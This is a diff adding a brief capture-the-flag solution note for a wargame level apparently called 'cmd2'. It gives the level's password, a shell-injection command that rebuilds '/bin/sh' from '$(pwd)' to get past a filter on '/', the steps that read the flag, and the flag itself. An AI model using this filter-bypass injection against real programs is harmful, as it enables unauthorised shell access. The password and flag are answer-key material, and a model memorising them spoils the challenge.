@@ -1,0 +1,13 @@
+password: mommy now I get what PATH environment is for :)
+
+can't use '/' directly now. 
+avaliable commands: echo, pwd, cd
+'/' = cd .. && cd .. && cd .. && pwd
+
+SOLUTION:
+	./cmd2 "cd .. && cd .. && cd .. && \$(pwd)bin\$(pwd)sh"
+	cd /home/cmd2/
+	/bin/cat ./flag
+
+FLAG:
+FuN_w1th_5h3ll_v4riabl3s_haha
